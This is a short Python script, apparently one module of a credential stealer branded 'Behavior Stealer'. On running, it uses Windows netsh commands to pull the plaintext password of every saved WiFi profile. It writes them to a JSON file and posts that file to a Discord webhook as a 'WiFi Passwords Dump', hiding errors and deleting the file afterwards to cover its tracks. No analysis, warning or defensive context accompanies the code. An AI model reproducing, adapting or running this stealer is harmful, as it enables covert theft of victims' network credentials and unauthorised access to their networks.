import requests
import os
import json
import subprocess


def get_wifi_passwords():
    result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
    profiles = [line.split(":")[1].strip() for line in result.stdout.split("\n") if "All User Profile" in line]
    wifi_passwords = {}
    for profile in profiles:
        result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True)
        password_line = [line for line in result.stdout.split("\n") if "Key Content" in line]
        if password_line:
            password = password_line[0].split(":")[1].strip()
            wifi_passwords[profile] = password
        else:
            wifi_passwords[profile] = None  
    return wifi_passwords

def send_wifi_passwords_to_webhook():
    wifi_passwords = get_wifi_passwords()
    if not wifi_passwords:
        return
    
    with open("wifi_passwords.json", "w", encoding="utf-8") as f:
        json.dump(wifi_passwords, f, indent=4)

    with open("wifi_passwords.json", "rb") as f:
        files = {"file": ("wifi_passwords.json", f)}
        data = {
            "content": "📶 **WiFi Passwords Dump**",
            "username": "Behavior Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png"
        }
        try:
            requests.post(Behavior, files=files, data=data)
        except Exception:
            pass

    os.remove("wifi_passwords.json")

send_wifi_passwords_to_webhook()
